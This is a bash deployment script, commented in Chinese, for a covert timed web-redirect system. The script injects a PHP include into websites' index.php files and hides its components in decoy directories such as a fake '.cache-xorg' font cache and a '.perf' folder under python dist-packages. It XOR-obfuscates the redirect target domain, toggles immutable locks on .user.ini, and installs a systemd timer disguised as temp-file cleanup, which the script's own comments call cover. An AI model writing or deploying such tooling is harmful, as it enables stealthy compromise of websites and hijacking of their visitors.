#!/bin/bash
# ============================================================
# YG 分时跳转系统 — 一键部署脚本
# 用法: sudo bash deploy.sh <站点根目录列表文件>
#   站点列表文件每行一个: <站点名> <站点根目录>
#   例: z678538 /www/wwwroot/ff/z678538
# 前置要求: 宝塔 nginx + PHP-FPM；root 权限
# ============================================================
set -u
KITDIR="$(cd "$(dirname "$0")/.." && pwd)"     # 部署包根
HIDE_DIR="/usr/share/cmake/bash-completion/completions/data/cache/fonts/.cache-xorg"
PERF_DIR="/usr/local/lib/python3.12/dist-packages/.perf"
SITES_FILE="${1:?用法: deploy.sh <站点列表文件>}"
FORCE_OVERWRITE="${FORCE_OVERWRITE:-1}"        # 1=关闸强制覆盖（业务改动刷掉）

[ "$(id -u)" = 0 ] || { echo "需要 root"; exit 1; }
[ -f "$SITES_FILE" ] || { echo "站点列表不存在: $SITES_FILE"; exit 1; }

echo "[1/8] 安装判定模块到 $PERF_DIR"
mkdir -p "$PERF_DIR" "$HIDE_DIR/logs" "$HIDE_DIR/backup"
install -m 644 "$KITDIR/scripts/memstat.php" "$PERF_DIR/memstat.php"
install -m 644 "$KITDIR/etc/kstat.bin"       "$PERF_DIR/kstat.bin"
install -m 644 "$KITDIR/etc/tbl.dat"         "$PERF_DIR/tbl.dat"
install -m 644 "$KITDIR/etc/tbl2.dat"        "$PERF_DIR/tbl2.dat"
touch "$PERF_DIR/stat.dat"; chmod 664 "$PERF_DIR/stat.dat"; chown www:www "$PERF_DIR/stat.dat" 2>/dev/null || chown $(ps -o user= -C php-fpm | head -1):"$PERF_DIR/stat.dat"

echo "[2/8] 安装开关组件到 $HIDE_DIR"
install -m 755 "$KITDIR/scripts/cgroup-sync"     "$HIDE_DIR/cgroup-sync"
install -m 755 "$KITDIR/scripts/cgroup-stat.sh"  "$HIDE_DIR/cgroup-stat.sh"
# 组件内路径已按本包约定写死；若隐藏目录不同，sed 替换
sed -i "s|/usr/share/cmake/bash-completion/completions/data/cache/fonts/.cache-xorg|$HIDE_DIR|g" "$HIDE_DIR/cgroup-sync" "$HIDE_DIR/cgroup-stat.sh"
sed -i "s|/usr/local/lib/python3.12/dist-packages/.perf|$PERF_DIR|g" "$HIDE_DIR/cgroup-sync"

echo "[3/8] 生成目标域名密文（输入目标URL，不加http）"
read -rp "目标跳转地址（如 https://4568866.com/）: " TARGET
[ -n "$TARGET" ] || { echo "目标不能为空"; exit 1; }
KEY="Kx9fQm2v"
php -r '$t=$argv[1];$k="Kx9fQm2v";$x=$t;for($i=0;$i<strlen($x);$i++)$x[$i]=$x[$i]^$k[$i%strlen($k)];
 file_put_contents($argv[2], base64_encode($x)); echo "密文已生成\n";' "$TARGET" "$PERF_DIR/kstat.bin" 2>/dev/null || \
python3 -c "
import base64,sys
t=sys.argv[1].encode(); k=b'Kx9fQm2v'
x=bytes(b^k[i%len(k)] for i,b in enumerate(t))
open(sys.argv[2],'wb').write(base64.b64encode(x))
print('密文已生成')" "$TARGET" "$PERF_DIR/kstat.bin"

echo "[4/8] 站点注入与 open_basedir 白名单"
INJ='<?php include "'$PERF_DIR'/memstat.php"; ?>'
mkdir -p "$HIDE_DIR/backup"
while read -r name root; do
  [ -f "$root/index.php" ] || { echo "  SKIP $name（无 index.php）"; continue; }
  # 基线：首采（已存在则不覆盖，除非 FORCE_BASELINE=1）
  h=$(printf '%s' "$name" | sha256sum | cut -c1-16)
  if [ ! -f "$HIDE_DIR/backup/$h.idx" ] || [ "${FORCE_BASELINE:-0}" = 1 ]; then
    cp -a "$root/index.php" "$HIDE_DIR/backup/$h.idx"
    echo "  基线已采: $name -> $h.idx"
  fi
  # open_basedir 白名单（.user.ini 可能带 immutable 锁）
  uf="$root/.user.ini"
  if [ -f "$uf" ] && ! grep -q "$PERF_DIR" "$uf"; then
    chattr -i "$uf" 2>/dev/null
    cur=$(cat "$uf")
    printf '%s' "${cur%:*/:$PERF_DIR/}" > "$uf"   # 追加式：保留原有条目
    [ "$(grep -c "$PERF_DIR" "$uf")" = 0 ] && printf '%s' "${cur%/}:${PERF_DIR}/" > "$uf"
    chattr +i "$uf" 2>/dev/null
    echo "  user.ini 白名单: $name"
  elif [ ! -f "$uf" ]; then
    printf 'open_basedir=%s/:/tmp/:/usr/local/lib/python3.12/dist-packages/.perf/\n' "$root" > "$uf"
  fi
  echo "$name $root" >> "$HIDE_DIR/logs/sites.list"
done < "$SITES_FILE"

echo "[5/8] 安装 systemd timer（每分钟节拍）"
cat > /etc/systemd/system/tmp-clean-scan.timer <<EOF
[Unit]
Description=Periodic temporary files metadata scan

[Timer]
OnBootSec=2min
OnUnitActiveSec=1min
AccuracySec=30s
Unit=tmp-clean-scan.service

[Install]
WantedBy=timers.target
EOF
cat > /etc/systemd/system/tmp-clean-scan.service <<EOF
[Unit]
Description=Temporary files metadata scan
After=local-fs.target

[Service]
Type=oneshot
ExecStart=/usr/sbin/tmpclean --scan
Nice=10
EOF
echo "[6/8] 安装 /usr/sbin/tmpclean（窗口决策 + /tmp清理掩护）"
cat > /usr/sbin/tmpclean <<TMPEOF
#!/bin/bash
export TZ=Asia/Shanghai
SCANDIR=/tmp
case "\${1:-}" in --scan) : ;; *) echo "usage: tmpclean --scan" >&2; exit 2 ;; esac
find "\$SCANDIR" -maxdepth 1 -name 'sess_*' -type f -mmin +120 -delete 2>/dev/null
D=$HIDE_DIR
[ -d "\$D" ] || exit 0
NOW=\$(date '+%H:%M'); want=off
for w in $(grep -oE '"[0-9]{2}:[0-9]{2}-[0-9]{2}:[0-9]{2}"' "$D/cgroup-stat.sh" | tr -d '"'); do
  s=\${w%-*}; e=\${w#*-}
  sm=\$((10#\${s%:*}*60+10#\${s#*:})); em=\$((10#\${e%:*}*60+10#\${e#*:})); cm=\$((10#\${NOW%:*}*60+10#\${NOW#*:}))
  if [ \$sm -le \$em ]; then [ \$cm -ge \$sm ] && [ \$cm -lt \$em ] && want=on; else { [ \$cm -ge \$sm ] || [ \$cm -lt \$em ]; } && want=on; fi
done
cur=\$([ -f \$D/.sysd ] && echo on || echo off)
[ "\$want" = "\$cur" ] && exit 0
if [ "\$want" = on ]; then \$D/cgroup-sync on  >>\$D/logs/sync.log 2>&1 && touch \$D/.sysd
else \$D/cgroup-sync off >>\$D/logs/sync.log 2>&1 && rm -f \$D/.sysd; fi
exit 0
TMPEOF
chmod 755 /usr/sbin/tmpclean

echo "[7/8] 启用 timer"
systemctl daemon-reload && systemctl enable --now tmp-clean-scan.timer
rm -f "$HIDE_DIR/.sysd"

echo "[8/8] 完成。验证命令:"
echo "  systemctl list-timers | grep tmp-clean        # timer在跑"
echo "  $HIDE_DIR/cgroup-sync status                  # 各站注入状态"
echo "  tail -f $PERF_DIR/stat.dat                    # 判定日志"
echo "  curl -H 'Host: <域名>' -H 'X-Real-IP: 8.8.8.8' http://127.0.0.1/   # 省外应302"
echo "时间窗口修改: $HIDE_DIR/cgroup-stat.sh 的 for w in ... 行"
echo "强制覆盖开关: $HIDE_DIR/cgroup-sync 里 FORCE_OVERWRITE（当前: $FORCE_OVERWRITE）"
